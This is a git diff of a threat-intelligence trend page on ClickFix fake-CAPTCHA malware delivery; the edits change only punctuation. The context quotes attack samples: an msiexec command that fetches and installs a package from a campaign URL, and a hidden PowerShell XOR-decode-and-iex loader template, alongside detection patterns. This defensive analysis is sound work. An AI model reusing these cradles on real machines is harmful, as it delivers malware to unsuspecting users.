@@ -1,6 +1,6 @@
 ---
 layout: default
-title: ClickFix Delivery Chain — Trend Analysis
+title: "ClickFix Delivery Chain: Trend Analysis"
 description: "10 months of MHaggis ClickGrab data analyzed through the Detection Chokepoint Framework. Tracks cradle family evolution, evasion technique shifts, and staging infrastructure from April 2025 to March 2026."
 permalink: /trends/clickgrab/
 ---
@@ -155,7 +155,7 @@ permalink: /trends/clickgrab/
 </nav>
 <div class="cg-page trends-content" id="overview">
 
-<h1>ClickFix Delivery Chain — Trend Analysis</h1>
+<h1>ClickFix Delivery Chain: Trend Analysis</h1>
 <p class="cg-meta">
   Data: <a href="https://github.com/mhaggis/ClickGrab" target="_blank" rel="noopener">MHaggis ClickGrab</a> + <a href="https://clickfix.carsonww.com/" target="_blank" rel="noopener">ClickFix Hunter</a>
   &nbsp;·&nbsp; Period: Apr 2025 – Apr 2026
@@ -193,7 +193,7 @@ permalink: /trends/clickgrab/
 
 <!-- ── Framework Chain Map ───────────────────────────────────────────── -->
 <h2 id="framework">Detection Chokepoint Framework</h2>
-<p>Every ClickFix variant — ClickFix, FileFix, TerminalFix, InstallFix — follows these five stages. The lure changes. The clipboard command changes. The delivery method changes. But the chain doesn't. Each badge maps to the ATT&CK technique you're actually detecting at that stage.</p>
+<p>Every ClickFix variant (ClickFix, FileFix, TerminalFix, InstallFix) follows these five stages. The lure changes. The clipboard command changes. The delivery method changes. But the chain doesn't. Each badge maps to the ATT&CK technique you're actually detecting at that stage.</p>
 
 <div class="cg-chain" role="list" aria-label="ClickFix delivery chain stages">
   <div class="cg-chain-stage cg-chain-stage--blind" role="listitem">
@@ -233,11 +233,11 @@ permalink: /trends/clickgrab/
   </div>
 </div>
 
-<p>Two behaviors survive every variant rotation: the process spawn (T1059) and the network fetch (T1105). The user opens Run, pastes, hits Enter — that parent→child process relationship is baked into the attack primitive. And until recently, every cradle had to reach out to a staging URL to pull the payload. That's where your detection bets pay off. We'll get to why "until recently" matters below. Full detection logic is on the <a href="{{ '/chokepoints/clickfix-techniques/' | relative_url }}">ClickFix Techniques chokepoint page</a>.</p>
+<p>Two behaviors survive every variant rotation: the process spawn (T1059) and the network fetch (T1105). The user opens Run, pastes, hits Enter. That parent→child process relationship is baked into the attack primitive. And until recently, every cradle had to reach out to a staging URL to pull the payload. That's where your detection bets pay off. We'll get to why "until recently" matters below. Full detection logic is on the <a href="{{ '/chokepoints/clickfix-techniques/' | relative_url }}">ClickFix Techniques chokepoint page</a>.</p>
 
 <!-- ── Chart A: Monthly Volume ───────────────────────────────────────── -->
-<h2 id="volume">Monthly Volume — Malicious Domain Count</h2>
-<p>Unique malicious ClickFix domains observed per month from the domain dataset. Volume spikes correlate with specific campaigns — the Nov 2025 surge was driven by the <code>shift-art.com</code> MSIExec campaign (669 domains).</p>
+<h2 id="volume">Monthly Volume: Malicious Domain Count</h2>
+<p>Unique malicious ClickFix domains observed per month from the domain dataset. Volume spikes correlate with specific campaigns. The Nov 2025 surge was driven by the <code>shift-art.com</code> MSIExec campaign (669 domains).</p>
 
 <div class="cg-chart-wrap">
   <div class="cg-chart-title">Malicious ClickFix domains by month</div>
@@ -246,7 +246,7 @@ permalink: /trends/clickgrab/
 
 <!-- ── Chart B: Cradle Family Evolution ──────────────────────────────── -->
 <h2 id="cradles">T1105 Ingress Tool Transfer: Cradle Family Evolution</h2>
-<p>The network fetch <em>was</em> the unavoidable action. This chart shows how adversaries rotated their download method as defenders tuned IWR/IEX-specific detections — and why that rotation actually validates the chokepoint approach.</p>
+<p>The network fetch <em>was</em> the unavoidable action. This chart shows how adversaries rotated their download method as defenders tuned IWR/IEX-specific detections. That rotation validates the chokepoint approach.</p>
 
 <div class="cg-chart-wrap">
   <div class="cg-chart-title">Monthly cradle family distribution (PowerShell download method)</div>
@@ -254,11 +254,11 @@ permalink: /trends/clickgrab/
 </div>
 
 <div class="cg-callout cg-callout--warn">
-  <strong>Dec 2025 pivot — your IWR detections worked.</strong> IWR/IEX drops sharply as WebClient and Curl surge in the same month. That's not coincidence — that's adversaries responding to detection pressure. If you were pattern-matching on <code>iwr|Invoke-WebRequest</code>, congratulations: you forced a rotation. But if that's <em>all</em> you were matching, your coverage just dropped to near-zero.
+  <strong>Dec 2025 pivot. Your IWR detections worked.</strong> IWR/IEX drops sharply as WebClient and Curl surge in the same month. That's not coincidence. That's adversaries responding to detection pressure. If you were pattern-matching on <code>iwr|Invoke-WebRequest</code>, congratulations: you forced a rotation. But if that's <em>all</em> you were matching, your coverage just dropped to near-zero.
 </div>
 
 <div class="cg-callout cg-callout--alert">
-  <strong>Mar 2026: IWR came back.</strong> After nearly disappearing in Dec–Jan, IWR surged to 27.7% in March. A <code>verifyhumanbot.com</code> / <code>SafeAntiBotsNet</code> campaign brought it right back. This is the whole point — cradle rotation is cyclical, not one-directional. The adversary who abandoned IWR in December picked it back up in March because defensive attention had shifted elsewhere. If you built behavioral rules (unusual parent → PowerShell → outbound fetch), you caught it both times. If you built string-match rules, you caught it, lost it, and caught it again — assuming you didn't delete the "obsolete" detection.
+  <strong>Mar 2026: IWR came back.</strong> After nearly disappearing in Dec–Jan, IWR surged to 27.7% in March. A <code>verifyhumanbot.com</code> / <code>SafeAntiBotsNet</code> campaign brought it right back. This is the whole point: cradle rotation is cyclical, not one-directional. The adversary who abandoned IWR in December picked it back up in March because defensive attention had shifted elsewhere. If you built behavioral rules (unusual parent → PowerShell → outbound fetch), you caught it both times. If you built string-match rules, you caught it, lost it, and caught it again (assuming you didn't delete the "obsolete" detection).
 </div>
 
 <div class="cg-callout cg-callout--info">
@@ -266,7 +266,7 @@ permalink: /trends/clickgrab/
 </div>
 
 <!-- ── Chart C: Evasion Technique Trends ─────────────────────────────── -->
-<h2 id="evasion">Evasion Technique Trends — Where Adversaries Are Adapting</h2>
+<h2 id="evasion">Evasion Technique Trends: Where Adversaries Are Adapting</h2>
 <p>Think of this chart as a conversation between attackers and defenders. Rising lines = defenders forced a change. Flat lines with spikes = a specific campaign tried something, then moved on. The trends tell you which evasion techniques are gaining traction and which were one-off experiments.</p>
 
 <div class="cg-chart-wrap">
@@ -275,37 +275,37 @@ permalink: /trends/clickgrab/
 </div>
 
 <div class="cg-callout cg-callout--warn">
-  <strong>Self-delete was a burst, not a trend.</strong> 27.4% in Dec → 2.3% Jan → 0% by April. One campaign tried it, others didn't pick it up. It's in the toolkit but it's not the future. If you built file-write-then-delete correlation rules in December, keep them — but the bigger threat is below.
+  <strong>Self-delete was a burst, not a trend.</strong> 27.4% in Dec → 2.3% Jan → 0% by April. One campaign tried it, others didn't pick it up. It's in the toolkit but it's not the future. If you built file-write-then-delete correlation rules in December, keep them. The bigger threat is below.
 </div>
 
 <div class="cg-callout cg-callout--warn">
-  <strong>Base64 isn't plateauing — it's accelerating.</strong> 19.5% in March, 54.2% in April. If your rules match plaintext <code>iwr https://</code> strings, you're seeing the encoded version now, not the decoded cradle. Detect the encoding act: <code>[Convert]::FromBase64String</code> piped to <code>iex</code>. Or detect <code>-enc</code> on the command line from an unusual parent. The content is opaque; the execution context isn't.
+  <strong>Base64 isn't plateauing. It's accelerating.</strong> 19.5% in March, 54.2% in April. If your rules match plaintext <code>iwr https://</code> strings, you're seeing the encoded version now, not the decoded cradle. Detect the encoding act: <code>[Convert]::FromBase64String</code> piped to <code>iex</code>. Or detect <code>-enc</code> on the command line from an unusual parent. The content is opaque; the execution context isn't.
 </div>
 
 <div class="cg-callout cg-callout--warn">
-  <strong>Mixed-case is dead.</strong> POWerShEll, PowErsHeLL — peaked mid-2025, trending to zero. Base64 replaced it as the primary obfuscation. If you shipped case-insensitive regex in 2025, you caught the tail end of a dying technique. Not wasted effort — but not where the action is anymore.
+  <strong>Mixed-case is dead.</strong> POWerShEll, PowErsHeLL peaked mid-2025, trending to zero. Base64 replaced it as the primary obfuscation. If you shipped case-insensitive regex in 2025, you caught the tail end of a dying technique. Not wasted effort, but not where the action is anymore.
 </div>
 
 <!-- ── MSIExec Delivery ─────────────────────────────────────────── -->
 <h2 id="msiexec">New Cradle Family: MSIExec Package Installation</h2>
-<p>In November 2025, the ClickFix chokepoint shifted underneath the detection layer. 87% of domains rotated from PowerShell cradles to <code>msiexec /i</code> — same social engineering invariant, completely different execution chain. MSIExec delivery peaked at 669/767 domains before declining through Q1 2026. The technique shift demonstrates why chokepoint-anchored detection matters: PowerShell-specific rules missed the rotation entirely, but detections built around the clipboard-to-execution invariant still caught the handoff.</p>
+<p>In November 2025, the ClickFix chokepoint shifted underneath the detection layer. 87% of domains rotated from PowerShell cradles to <code>msiexec /i</code>. Same social engineering invariant, completely different execution chain. MSIExec delivery peaked at 669/767 domains before declining through Q1 2026. The technique shift demonstrates why chokepoint-anchored detection matters: PowerShell-specific rules missed the rotation entirely, but detections built around the clipboard-to-execution invariant still caught the handoff.</p>
 
-<p>The <code>shift-art.com</code> campaign drove the surge — 651 domains using fake Cloudflare verification paths. The URL structure alone is worth a detection:</p>
+<p>The <code>shift-art.com</code> campaign drove the surge: 651 domains using fake Cloudflare verification paths. The URL structure alone is worth a detection:</p>
 
 <pre class="logic-block rounded-lg p-4 overflow-x-auto text-[.8rem]"><code>msiexec /i https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/</code></pre>
 
 <div class="cg-callout cg-callout--alert">
-  <strong>Same chokepoint, different binary.</strong> <code>msiexec.exe</code> spawning from <code>cmd.exe</code> or Run dialog, fetching an MSI from a non-enterprise URL — that's the same parent→child process execution chokepoint (T1059/T1218) as the PowerShell cradles. The invariant is the process relationship, not the binary name. Oct 18% → <strong>Nov 87%</strong> → Dec 34% → Jan 24% → Feb 29% → Mar 2%.
+  <strong>Same chokepoint, different binary.</strong> <code>msiexec.exe</code> spawning from <code>cmd.exe</code> or Run dialog, fetching an MSI from a non-enterprise URL. That's the same parent→child process execution chokepoint (T1059/T1218) as the PowerShell cradles. The invariant is the process relationship, not the binary name. Oct 18% → <strong>Nov 87%</strong> → Dec 34% → Jan 24% → Feb 29% → Mar 2%.
 </div>
 
 <h3>WScript/VBS: A Failed Diversification (Dec 2025 – Feb 2026)</h3>
-<p>Adversaries also tried VBS in the same diversification window — Dec 2025 (21.9%), peaked Jan (46.3%), dead by March (0%). Used <code>CreateObject("WinHttp.WinHttpRequest.5.1")</code> to fetch payloads via WScript. Abandoned fast. EDR catches WScript execution reliably, so this branch got pruned while WebClient and Curl survived. Not every experiment sticks.</p>
+<p>Adversaries also tried VBS in the same diversification window: Dec 2025 (21.9%), peaked Jan (46.3%), dead by March (0%). Used <code>CreateObject("WinHttp.WinHttpRequest.5.1")</code> to fetch payloads via WScript. Abandoned fast. EDR catches WScript execution reliably, so this branch got pruned while WebClient and Curl survived. Not every experiment sticks.</p>
 
 <!-- ── Inline Payloads ─────────────────────────────────────────── -->
 <h2 id="inline">Strategic Shift: Inline Payloads Bypassing Network Fetch Detection</h2>
-<p>Here's the finding that changes the detection calculus: <strong>75% of April 2026 domains have no URL in the clipboard command at all.</strong> Up from 28% in August. The payload is entirely inline — the user pastes everything needed, and nothing reaches out to a staging server. Your network-fetch detection? It never fires.</p>
+<p>Here's the finding that changes the detection calculus: <strong>75% of April 2026 domains have no URL in the clipboard command at all.</strong> Up from 28% in August. The payload is entirely inline. The user pastes everything needed, and nothing reaches out to a staging server. Your network-fetch detection? It never fires.</p>
 
-<p>Three techniques are driving this: <strong>hex XOR</strong> (<code>$k/$d</code> variable patterns with <code>-bxor</code> decoding, 62 instances in March), <strong>Base64 <code>-enc</code></strong> (over half of April samples), and <strong>direct embedding</strong> with no obfuscation at all. The social engineering does double duty — fake CAPTCHA comments inside the payload reinforce the lure:</p>
+<p>Three techniques are driving this: <strong>hex XOR</strong> (<code>$k/$d</code> variable patterns with <code>-bxor</code> decoding, 62 instances in March), <strong>Base64 <code>-enc</code></strong> (over half of April samples), and <strong>direct embedding</strong> with no obfuscation at all. The social engineering does double duty: fake CAPTCHA comments inside the payload reinforce the lure:</p>
 
 <pre class="logic-block rounded-lg p-4 overflow-x-auto text-[.8rem]"><code>powershell -w hidden &lt;# I am not a robot - Cloudflare ID: 8e3f2a #&gt; $k='xK9mP2';$d='4a5b6c...';
 $b=[byte[]]@();for($i=0;$i-lt$d.Length;$i+=2){$b+=[byte]("0x"+$d.Substring($i,2))-bxor[byte]$k[$i%$k.Length]};
@@ -326,7 +326,7 @@ iex([Text.Encoding]::UTF8.GetString($b))</code></pre>
 
 <!-- ── Staging Infrastructure ────────────────────────────────────────── -->
 <h2 id="staging">Staging Infrastructure</h2>
-<p>Where the payloads actually live. CDN-hosted staging defeats domain-reputation blocking because the infrastructure <em>is</em> legitimate web hosting. You can't blocklist <code>raw.githubusercontent.com</code> without breaking your developers' workflows. Detection has to be contextual — a network appliance fetching a shell script from GitHub and piping it to bash is anomalous regardless of the domain.</p>
+<p>Where the payloads actually live. CDN-hosted staging defeats domain-reputation blocking because the infrastructure <em>is</em> legitimate web hosting. You can't blocklist <code>raw.githubusercontent.com</code> without breaking your developers' workflows. Detection has to be contextual: a network appliance fetching a shell script from GitHub and piping it to bash is anomalous regardless of the domain.</p>
 
 <div style="overflow-x:auto;">
 <table class="cg-table">
@@ -358,7 +358,7 @@ iex([Text.Encoding]::UTF8.GetString($b))</code></pre>
       </td>
       <td style="color:var(--text-muted);font-family:inherit;font-size:.8rem;">
         {% if d.cdn %}Domain reputation blocklists ineffective (legitimate CDN provider)
-        {% elsif d.domain contains "wpengine.com" %}Managed WP hosting — likely compromised; blocklist removes legitimate sites
+        {% elsif d.domain contains "wpengine.com" %}Managed WP hosting, likely compromised; blocklist removes legitimate sites
         {% elsif d.domain contains "blogspot.com" or d.domain contains "blogger.com" %}Google-hosted; domain blocking would block all of Blogger
         {% else %}—{% endif %}
       </td>
@@ -422,10 +422,10 @@ iex([Text.Encoding]::UTF8.GetString($b))</code></pre>
 </table>
 </div>
 
-<p style="font-size:.75rem;color:var(--text-dim);margin:.25rem 0 .75rem;">Domain names and observation counts are from ClickGrab nightly reports. Hosting type is only classified when verifiable from the domain itself (e.g., <code>*.cdn-website.com</code> = CDN, <code>*.wpengine.com</code> = managed hosting). IP enrichment (ASN, geo, registrar) requires running the enrichment pipeline — unverified entries show "Unknown."</p>
+<p style="font-size:.75rem;color:var(--text-dim);margin:.25rem 0 .75rem;">Domain names and observation counts are from ClickGrab nightly reports. Hosting type is only classified when verifiable from the domain itself (e.g., <code>*.cdn-website.com</code> = CDN, <code>*.wpengine.com</code> = managed hosting). IP enrichment (ASN, geo, registrar) requires running the enrichment pipeline. Unverified entries show "Unknown."</p>
 
 <div class="cg-callout cg-callout--alert">
-  <strong>CDN-hosted staging defeats domain blocking.</strong> <code>irp.cdn-website.com</code> appeared in {{ site.data.clickgrab_trends.evasion_totals.cdn_staging }} payload fetches. This is a legitimate CDN used by website builders — blocking it would impact legitimate sites. Detection must shift to behavioral signals (PowerShell → network → unusual domain path) rather than domain-reputation lookup.
+  <strong>CDN-hosted staging defeats domain blocking.</strong> <code>irp.cdn-website.com</code> appeared in {{ site.data.clickgrab_trends.evasion_totals.cdn_staging }} payload fetches. This is a legitimate CDN used by website builders. Blocking it would impact legitimate sites. Detection must shift to behavioral signals (PowerShell → network → unusual domain path) rather than domain-reputation lookup.
 </div>
 
 <!-- ── Detection Recommendations ────────────────────────────────────── -->
@@ -587,7 +587,7 @@ iex([Text.Encoding]::UTF8.GetString($b))</code></pre>
   <div class="cg-rec-tier"><span class="cg-tier-badge cg-tier-t1" style="display:block;text-align:center;padding:.25rem .5rem;">T1059</span></div>
   <div class="cg-rec-body">
     <strong>Detect inline payload decode-and-execute</strong>
-    PowerShell with <code>-enc</code> flag or XOR decode operations (<code>-bxor</code>, <code>[byte]</code>, <code>[char]</code>) spawned from unusual parent (Run dialog chain). Also: <code>[Convert]::FromBase64String</code> followed by <code>iex</code>. Covers the 28% → 75% growth in inline payloads that skip the network fetch entirely. <strong>Run alongside network-fetch detection — both are needed for full coverage.</strong>
+    PowerShell with <code>-enc</code> flag or XOR decode operations (<code>-bxor</code>, <code>[byte]</code>, <code>[char]</code>) spawned from unusual parent (Run dialog chain). Also: <code>[Convert]::FromBase64String</code> followed by <code>iex</code>. Covers the 28% → 75% growth in inline payloads that skip the network fetch entirely. <strong>Run alongside network-fetch detection. Both are needed for full coverage.</strong>
   </div>
 </div>
 
